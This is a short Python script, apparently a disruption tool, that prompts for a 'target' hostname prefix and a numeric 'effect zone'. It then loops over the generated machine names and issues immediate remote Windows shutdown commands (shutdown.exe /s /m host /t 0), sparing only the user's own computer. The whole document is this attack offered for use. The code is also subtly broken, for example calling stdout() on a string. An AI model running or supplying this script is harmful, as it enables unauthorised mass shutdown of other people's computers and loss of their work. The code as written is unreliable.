import subprocess

print("you are pc: ")
z = subprocess.run(['hostname'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True) 
z = z.stdout()

def shutdown():
    shutdown_hostnames = input("Enter the hostname of the target computer: ")
    x = int(input("what is the start of your effect zone: "))
    y = int(input("what is the end of your effect zone: "))
    for i in range(x, (y+1)):
        shutdown = shutdown_hostnames + str(i)
        if shutdown == z:
            print("found you")
        else:
            print("hit")
            subprocess.call(["C:\\Windows\\System32\\shutdown.exe", "/s", "/m", shutdown, "/t", "0"])

shutdown()
